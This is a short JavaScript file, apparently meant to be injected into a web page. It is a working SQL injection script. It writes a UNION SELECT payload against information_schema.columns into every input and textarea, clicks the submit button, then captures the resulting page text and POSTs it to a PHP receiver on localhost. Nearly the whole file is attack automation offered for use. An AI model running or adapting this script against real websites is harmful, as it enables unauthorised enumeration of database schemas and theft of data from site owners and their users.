(function () {
  if (sessionStorage.getItem('sqlTested') === 'true') {
    console.log("SQL Injection already tested, logging and sending result:");

    setTimeout(() => {
      const resultText = document.body.innerText;
      console.log(resultText);

      // Send the result to your Apache server
      fetch('http://localhost/result_reciever.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ output: resultText })
      }).then(response => {
        console.log("Result sent to server.");
      }).catch(error => {
        console.error("Failed to send result:", error);
      });

      sessionStorage.removeItem('sqlTested');
    }, 1000);
    return;
  }

  console.log("Running SQL Injection script...");

  const sqlPayloads = [
    "' UNION SELECT table_name, column_name FROM information_schema.columns --"
  ];

  const formInputs = document.querySelectorAll('input, textarea');
  formInputs.forEach(input => {
    input.value = sqlPayloads[0];
    console.log(`Injected into: ${input.name || input.id}`);
  });

  // Find and click the submit button
  const submitButton = [...document.querySelectorAll('input, button')]
    .find(el => el.type === 'submit' || el.value?.toLowerCase() === 'submit');

  if (submitButton) {
    sessionStorage.setItem('sqlTested', 'true');
    setTimeout(() => {
      console.log("Clicking submit button...");
      submitButton.click(); // Simulate user click
    }, 1000);
  } else {
    console.warn("Submit button not found.");
  }
})();
